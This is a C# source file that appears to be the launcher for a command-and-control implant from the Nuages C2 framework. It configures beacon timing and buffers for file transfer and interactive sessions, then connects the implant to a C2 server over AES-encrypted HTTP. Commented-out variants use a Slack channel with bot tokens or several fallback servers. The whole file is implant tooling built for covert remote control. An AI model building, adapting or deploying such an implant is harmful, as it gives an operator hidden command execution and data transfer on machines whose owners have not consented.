using System.Collections.Generic;

namespace NuagesSharpImplant
{
    class Program
    {
        static void Main(string[] args)
        {

            Dictionary<string, string> config = new Dictionary<string, string>();

            // Sleep time in between heartbeats
            config["sleep"] = "1";

            // Buffer size for pipes (file transfers / tcp / interactive)
            config["buffersize"] = "65535";

            // Refreshrate in milliseconds
            config["refreshrate"] = "500";

            // If the Direct connector is used (VERY BAD PRACTICE - Only for POC)
            //DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));

            // If the HTTPAES256 Handler is used:
            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));

            // If the SLACKAES256 Handler is used:
            // SLACKAES256Connection connection = new SLACKAES256Connection("password", "CHANNELID", "SLACK_BOT_TOKEN", "SLACK_APP_TOKEN", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));

            // If the multiple connections are used
            //List<NuagesC2Connection> connections = new List<NuagesC2Connection>();

            //connections.Add(new HTTPAES256Connection("http://127.0.0.1:8888", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"])));

            //connections.Add(new HTTPAES256Connection("http://127.0.0.1:8889", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"])));

            //MultiConnection connection = new MultiConnection(connections, int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));

            NuagesC2Connector connector = new NuagesC2Connector(connection);

            NuagesC2Implant implant = new NuagesC2Implant(config, connector);

            implant.Start();
        }
    }
}
